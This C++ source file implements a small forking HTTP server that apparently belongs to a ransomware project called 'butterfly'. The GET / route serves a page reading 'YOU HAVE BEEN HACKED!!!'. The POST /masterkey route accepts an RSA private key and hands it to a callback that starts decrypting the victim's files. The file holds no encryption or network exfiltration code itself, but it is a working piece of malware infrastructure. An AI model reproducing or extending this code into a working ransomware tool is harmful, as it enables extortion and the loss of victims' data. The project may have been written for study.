
#include "httpServer.h"

namespace butterfly
{

HTTPServer::HTTPServer(unsigned int port) : _port(port),  _running(false), _TCPSocket(std::make_shared<TCPSocket>()), _newTCPSocket(std::make_shared<TCPSocket>())
{
    LOG_TRACE("Create class HTTPServer");

    _TCPSocket->bind(_port);
    _TCPSocket->listen();
}

HTTPServer::~HTTPServer()
{
    _TCPSocket->disconnect();
}

void HTTPServer::registerMasterPKeyCB(std::function<void(std::string)> cb)
{
    _masterPKeyCB = cb;
}

void HTTPServer::run()
{
    LOG_INFO("Running HTTPServer on port " << _port);
    _running = true;

    while(_running)
    {

        // blocking accept call
        _newTCPSocket = _TCPSocket->accept();


        if(fork() == 0)
        {
            if(handleRequest())
            {
                exit(-1);
            }

            exit(0);

        }

        _newTCPSocket->disconnect();
        _newTCPSocket.reset();
    }

}

void HTTPServer::stop()
{
    _running = false;
}

bool HTTPServer::handleRequest()
{

    LOG_TRACE("Handle new HTTP Request!");
    _httpRequest  = std::unique_ptr<HTTPRequest>(new HTTPRequest());
    _httpResponse = std::unique_ptr<HTTPResponse>(new HTTPResponse());

    // parse incoming data from TCP Socket
    if ( recvRequest() )
    {
        // process the HTTP request
        processRequest();

        // send the HTTP Response via the TCP Socket
        return sendResponse();

    } else
    {
        return false;
    }

}

bool HTTPServer::recvRequest()
{

    std::string data = _newTCPSocket->recvAll(1024);

    if ( !data.empty() )
    {
        _httpRequest->addHTTPData(data);
        return true;
    }
    else
    {
        LOG_ERROR("No HTTP Data received!");
        return false;
    }

}

void HTTPServer::processRequest()
{

    _httpRequest->parseIncoming();

    Method  m = _httpRequest->getMethod();
    std::string url = _httpRequest->getURL();

    if ( m == Method::GET )
    {
        if ( url == "/" )
        {
            LOG_TRACE("Prepare Browser Response");
            browserRoute();
        } else
        {
            errorResponse(404);
        }

    } else if ( m == Method::POST )
    {

        if ( url == "/masterkey" )
        {
            LOG_TRACE("Extracting provided masterkey from HTTP Request");

            if ( masterKeyRoute() )
            {
                successResponse(200);
            } else
            {
                errorResponse(400);
            }

        } else
        {
            errorResponse(404);
        }

    } else
    {
        LOG_ERROR("Method not supported from HTTP Server!");
        errorResponse(500);
    }

    //_httpRequest->print();
}

bool HTTPServer::sendResponse()
{

    return _newTCPSocket->send(_httpResponse->getHTTPData());
}

bool HTTPServer::masterKeyRoute()
{
    std::string key = _httpRequest->getBody();

    // get the key as value parameter
    //std::string key = body.substr( body.find('=') + 1, body.length() - body.find('='));

    if ( !key.empty() && ( key.find("-----BEGIN RSA PRIVATE KEY-----") != std::string::npos) )
    {
        // If we received a masterkey, invoke the masterPKeyCB callback to start the decrypting procedure
        if ( _masterPKeyCB)
        {

            _masterPKeyCB(key);

        } else
        {
            LOG_ERROR("No MasterPrivateKey Callback registered!");
        }
        return true;
    } else
    {
        LOG_ERROR("Invalid Private Key provided on /masterkey Route!")
        return false;
    }

}

void HTTPServer::browserRoute()
{

    _httpResponse->setProtocol(Protocol::HTTP1_1);
    _httpResponse->setStatusCode(302);
    _httpResponse->setReasonPhrase(_httpResponse->getStatusCode());
    _httpResponse->setHTTPHeader("Content-Type", "text/html; charset=utf8");
    _httpResponse->addBody("<!DOCTYPE html><html><body><h1>YOU HAVE BEEN HACKED!!!</h1></body></html>");
    _httpResponse->setHTTPHeader("Content-Length", std::to_string(_httpResponse->getBody().length()));

    _httpResponse->prepareOutgoing();

}

void HTTPServer::successResponse(size_t statusCode)
{

    _httpResponse->setProtocol(Protocol::HTTP1_1);
    _httpResponse->setStatusCode(statusCode);
    _httpResponse->setReasonPhrase(_httpResponse->getStatusCode());
    _httpResponse->setHTTPHeader("Content-Type", "text/html; charset=utf8");

    _httpResponse->prepareOutgoing();
}

void HTTPServer::errorResponse(size_t statusCode)
{

    _httpResponse->setProtocol(Protocol::HTTP1_1);
    _httpResponse->setStatusCode(statusCode);
    _httpResponse->setReasonPhrase(_httpResponse->getStatusCode());
    _httpResponse->setHTTPHeader("Content-Type", "text/html; charset=utf8");

    _httpResponse->prepareOutgoing();
}

} // namespace butterfly
